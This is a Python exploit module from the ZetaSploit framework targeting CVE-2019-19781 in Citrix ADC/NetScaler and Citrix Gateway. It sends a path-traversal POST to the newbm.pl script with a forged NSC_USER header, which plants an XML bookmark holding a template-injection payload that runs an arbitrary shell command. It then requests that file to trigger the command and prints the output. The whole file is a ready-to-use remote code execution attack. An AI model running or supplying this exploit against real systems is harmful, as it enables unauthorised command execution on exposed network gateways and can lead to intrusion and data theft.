#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import requests
import string
import random
import re
import sys

from requests.packages.urllib3.exceptions import InsecureRequestWarning

from core.badges import badges
from core.parser import parser
from core.helper import helper

class ZetaSploitModule:
    def __init__(self):
        self.badges = badges()
        self.parser = parser()
        self.helper = helper()
        
        self.details = {
            'Name': "exploit/multi/citrix_adc_netscaler/cve_2019_19781",
            'Authors': [
                'enty8080'
            ],
            'Description': "Remote Code Execution in Citrix Application Delivery Controller and Citrix Gateway.",
            'Dependencies': [
                'requests'
            ],
            'Comments': [
                ''
            ],
            'Risk': "high"
        }
        
        self.options = {
            'URL': {
                'Description': "Target URL address.",
                'Value': None,
                'Required': True
            },
            'COMMAND': {
                'Description': "Command to execute.",
                'Value': "uname -a",
                'Required': True
            }
        }
        
    def run(self):
        target_url, command = self.parser.parse_options(self.options)
        target_url = self.helper.normalize_url(target_url)
        
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        self.badges.output_process("Exploiting " + target_url + "...")
        
        self.badges.output_process("Generating random XML bookmark...")
        random_xml = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
        self.badges.output_process("Adding XML bookmark " + random_xml + ".xml...")

        burp0_url = target_url + "/vpn/../vpns/portal/scripts/newbm.pl"
        burp0_headers = {"NSC_USER": "../../../../netscaler/portal/templates/" + random_xml, "NSC_NONCE": "c", "Connection": "close"}
        burp0_data = {"url": "https://example.com", "title": "[%t=template.new({'BLOCK'='print `" + str(command) + "`'})%][ % t % ]", "desc": "test", "UI_inuse": "RfWeb"}
        r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data,verify=False)

        if r.status_code == 200:
            self.badges.output_success("XML bookmark added!")
        else:
            self.badges.output_error("Failed to add XML bookmark!")
            return
        
        self.badges.output_process("Attempting to execute command...")
        burp0_url = target_url + "/vpns/portal/" + random_xml + ".xml"
        burp0_headers = {"NSC_USER": "../../../../netscaler/portal/templates/" + random_xml, "NSC_NONCE": "c", "Connection": "close"}
        r = requests.get(burp0_url, headers=burp0_headers, verify=False)

        self.badges.output_process("Obtaining command output...")
        replaced = re.sub('^&#.*&#10;$', '', r.text, flags=re.MULTILINE)
        self.badges.output_information("Command output: ")
        self.badges.output_empty(replaced)
